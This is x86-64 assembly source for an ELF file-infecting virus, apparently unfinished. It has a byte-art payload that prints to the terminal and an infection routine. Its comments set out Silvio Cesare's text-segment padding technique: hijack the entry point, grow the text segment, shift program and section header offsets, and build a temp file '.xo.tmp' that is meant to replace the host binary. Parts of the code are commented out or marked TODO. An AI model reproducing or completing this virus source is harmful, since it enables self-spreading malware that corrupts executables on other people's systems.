		db 0x2c,0x2c,0x2c,0x24,0x2b,0x2c,0x2e,0x2e,0x2e,0x2c,0x24,0x2c,0x2c,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x59,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x50,0x50,0x2b,0x2a,0x25,0x2b,0x24,0x24,0x24,0x2b,0x2b,0x2c,0x2c
		db 0x59,0x59,0x2c,0x2c,0x2c,0x59,0x59,0x2c,0x2e,0x2c,0x24,0x2c,0x2e,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x2c,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x2b,0x50,0x2b,0x50,0x2c,0x2c,0x2b,0x2c,0x2e,0x50,0x2b,0x2c,0x24,0x2a,0x24,0x2c,0x2c,0x2c,0x59,0x2a,0x24
		db 0x2c,0x59,0x50,0x24,0x24,0x59,0x59,0x24,0x2c,0x2c,0x24,0x2c,0x2e,0x2e,0x2c,0x2c,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2b,0x50,0x50,0x59,0x24,0x24,0x2c,0x2c,0x2b,0x59,0x24,0x50,0x2a,0x59,0x59,0x25,0x25,0x2a,0x2a,0x2a,0x25,0x25
		db 0x2b,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2e,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x24,0x2a,0x2a,0x50,0x50,0x2a,0x25,0x25,0x25,0x44,0x44,0x25,0x44,0x44,0x25,0x25,0x2a,0x44,0x2a,0x2b,0x59,0x59
		db 0x2b,0x2c,0x2e,0x2e,0x2e,0x2e,0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0xa,0x24,0x2c,0x2c,0x2c,0x59,0x2a,0x2b,0x59,0x2b,0x59,0x50,0x50,0x24,0x2a,0x2b,0x24,0x25,0x2a,0x2c,0x2c,0x24,0x44,0x2a,0x24,0x2c
		db 0x24,0x50,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0xa,0x24,0x24,0x24,0x24,0x24,0x50,0x2a,0x2b,0x59,0x2b,0x2b,0x25,0x2b,0x25,0x25,0x2b,0x2a,0x25,0x50,0x2b,0x50,0x2a,0x2b,0x59
		db 0x2b,0x2b,0x2b,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0xa,0x24,0x24,0x24,0x24,0x2b,0x50,0x2a,0x50,0x50,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x2b,0xa,0x59,0x59,0x59,0x2b,0x2a,0x2a,0x2a,0x2a,0x2a,0x50,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24
		db 0x24,0x24,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0xa,0x59,0x59,0x2b,0x2b,0x2a,0x25,0x2a,0x2a,0x50,0x2b,0x2b,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24
	payload_len equ $-painting
	
payload:
	pop rsi
	mov rdx, payload_len
	mov rax, SYS_WRITE
	mov rdi, STDOUT
	syscall
	
	jmp _restore

;jmp frankenstein_elf		
;****************************************************************************************
;	Infection routine:
;
;	assumes the following:
; 	vlen == length of virus code
;	PAGESIZE == 4096	
;
;	1. identify entry point of host program and patch virus code to jump back to original
;	host entry point
;	2. 	a. copy ELF header from host program to virus;
;		b. change e_shoff in virus ELF header to new e_shoff s.t. 
;			new_vx_e_shoff = host_e_shoff + PAGESIZE
;	3. 	a. Loop through all Phdrs to find the text segment Phdr
;		b. if curr_Phdr == text_segment_Phdr then, do the following:
;			i. modify entry point of ELF header to point to the virus code
;			ii. increase p_filesz by vlen [p_filesz += vlen] 
;			iii. increase p_memsz by vlen, [p_memsz += vlen]
;		c. Else, for all Phdrs corresponding to segments located after the inserted virus code (aka for each Phdr of a segment after the text segment), then, do the following:
;			i. increase p_offset by PAGESIZE
;	4. Loop through all Shdrs
;		a. If curr_shdr == last_shdr_text_segment then,
;			i. increase sh_len by vlen [sh_len += vlen]
;		b. Else, for all Shdrs corresponding to sections located after the inserted virus code (aka for each Shdr of a section after virus code), then, do the following:
;			i. increase sh_offset by PAGESIZE [sh_offset += PAGESIZE]
;	5. Insert the virus code into the host program (or, in our case, into the tempfile we are constructing to replace host program)
;
;****************************************************************************************

infect:
;	sub rsp, 0x8
	;push rbp
	;mov rbp, rsp
;	lea r13, [rax + elf_ehdr]
	;;mov r13, rax
	mov r13, [r14+ 800]				;location on stack where we saved address returned from mmap syscall
	;jmp frankenstein_elf
	;mov r12, rax
	mov r12, [r13 + elf_ehdr.e_phoff]		;address of host ELF Program Header Table in r12
	mov r15, [r13 + elf_ehdr.e_shoff] 	;address of host ELF Section Header Table in r15
	mov rdx, checkphdrstartlen
	lea rsi, checkphdrstart
	mov rdi, STDOUT
	mov rax, SYS_WRITE
	syscall

	
;;	mov qword r11, [rax + elf_ehdr.e_entry] ;save original host file entry point for jmp in vx code
;;	mov qword [vxhostentry], r11
;****************************************************************************************
;	Update program headers of infected ELF
;
;	e_phentsize == size of program header entry	
;	size of program header table == e_phnum * e_phentsize
;
;	vx_offset = the offset to start of vx code after insertion into host program 
;	vx_offset will replace e_entry in ELF header as the new entry point in infected ELF
;
;
;****************************************************************************************
	xor rcx, rcx
	mov word cx, [r13 + elf_ehdr.e_phnum]
	mov rdx, [r13 + elf_ehdr.e_phentsize]

	check_phdrs:
		.phdr_loop:
			;cmp rcx, 0
			;jg .mod_subsequent_phdr		
			cmp word [r12 + elf_phdr.p_type], PT_LOAD			
			jne .mod_subsequent_phdr
			.mod_curr_header:
				mov rdx, checkptloadpasslen
				lea rsi, checkptloadpass
				mov rdi, STDOUT
				mov rax, SYS_WRITE
				syscall
	;		mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
	;		add r10, [r13 + r12 + elf_phdr.p_filesz]
	;		add qword r10, [ventry]				;new entry point = evaddr + ventry
	;		mov qword [evaddr], r10
	;		mov [rax + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
	;		mov r10, [r12 + elf_phdr.p_offset] 
	;		add r10, [r12 + elf_phdr.p_filesz]				
	;		mov qword [vxoffset], r10
	;		add qword [r12 + elf_phdr.p_filesz], vlen	
	;		add qword [r12 + elf_phdr.p_memsz], vlen	

			.mod_subsequent_phdr:
				mov rdx, checkptloadfaillen
				lea rsi, checkptloadfail
				mov rdi, STDOUT
				mov rax, SYS_WRITE
				syscall
				;mov edi, dword [r12 + elf_phdr.p_offset]
				;add edi, PAGESIZE
				;mov dword [r12 + elf_phdr.p_offset], edi
		.next_phdr:
			dec cx 
			;add r12w, dx 
		;;	add r12d, dword [rax+ elf_ehdr.e_phentsize]
			;cmp cx, word [r13 + elf_ehdr.e_phnum]
			cmp cx, 0
			;jg check_shdrs
			;jnz .phdr_loop			
			;je frankenstein_elf
			;add word r12w, [r13 + elf_ehdr.e_phentsize]

	jmp frankenstein_elf
;****************************************************************************************
;	Now update section headers of infected ELF
;****************************************************************************************

	mov rdx, [rax + elf_ehdr.e_shentsize]
	xor r11, r11
	xor rcx, rcx
	check_shdrs:
		push rcx
		.shdr_loop:
			cmp qword [r15 + elf_shdr.sh_offset], vxoffset
			jge .mod_subsequent_shdr
			mov r11, [r15 + elf_shdr.sh_addr]
			add r11, [r15 + elf_shdr.sh_size]
			cmp r10, r11
			jne .mod_subsequent_shdr
			add qword [r15 + elf_shdr.sh_size], vlen


			.mod_subsequent_shdr:
				add qword [r15 + elf_shdr.sh_offset], PAGESIZE
		;.next_shdr:
		pop rcx
		inc rcx 
		add r15, rdx 
		cmp rcx, [rax + elf_ehdr.e_shnum]
		jl .shdr_loop

	mov r11, qword [rax + elf_ehdr.e_shoff]
	mov qword [oshoff], r11
	cmp qword r11, [vxoffset]
	;jg .patch_ehdr_shoff
	jl frankenstein_elf
	jmp fin_infect
	
	

;****************************************************************************************
;	From silvio's article [1], we know that an infected ELF will have 
;	the following layout:
;
;	ELF Header
;	Program Header Table
;	Segment 1
;		text
;		parasite
;
;	Segment 2
;	Section Header Table
;	Section 1
;	...
;	Section n
;
;	So this is the order in which we will construct (write to) our new complete
;	infected ELF -- currently a temp file, to be renamed to that of the host
;
;
;	Our plan for building this file will be to do the following:
;	create new temp file ".xo.tmp"
;	lseek to position 0 in .xo.tmp
;	write modified elf header to .xo.tmp
;	write modified program header to .xo.tmp
;	lseek to host text segment in host ELF 
;	copy (write) host text segment from host ELF to .xo.tmp
;	write virus body to .xo.tmp
;	write patched jmp to original host entry point (push ret), after  vx body in .xo.tmp
;	write any padding bytes needed to maintain page alignment for temp file
;	write modified section header table to .xo.tmp
;	lseek to end of section header table in host ELF
;	copy (write) remaining bytes (end of shdr table to EOF) from host ELF to .xo.tmp
;	
;	TODO: add routine for renaming .xo.tmp to original host file name
;	TODO: add routine for changing permissions/owner of infected ELF to match 
;			those of the original host file
;	close temp file
;	unmap file from memory
;
;****************************************************************************************

frankenstein_elf:
	mov rax, 0x00706d742e6f782e		;temp filename = ".xo.tmp\0"
	mov [r14 + 0x800], rax
	lea rdi, [r14 + 0x800]			;name of file in rdi
	mov rsi, 0777o					;mode - 755 (file perms for new file)
									;(O_CREAT | O_TRUNC | O_WRONLY)
	mov rax, SYS_CREAT
	syscall
	
	mov r9, rax
	mov rdi, rax

	;write ELF header to temp file

	mov rdx, 512
	;mov rdx, 64
	mov rsi, r13					;r13 contains pointer to mmap'd file
	mov rax, SYS_WRITE
	syscall
	
	;munmap file from work area
	;mov qword rsi, [elf_filesize]
;	mov rdi, r13
;	mov rsi, [r14 + filestat.st_size]
;	mov rax, SYS_MUNMAP
;	syscall

	;close temp file

	mov rdi, r9
	mov rax, SYS_CLOSE
	syscall


fin_infect:
	ret


;;restore stack to original state
_restore:
	add rsp, 0x1000
	mov rsp, rbp
	pop rbp
	
;exit
_end:
	xor rdi, rdi
	mov rax, 0x3c ;exit() syscall on x64
	syscall	

vlen equ $-_start


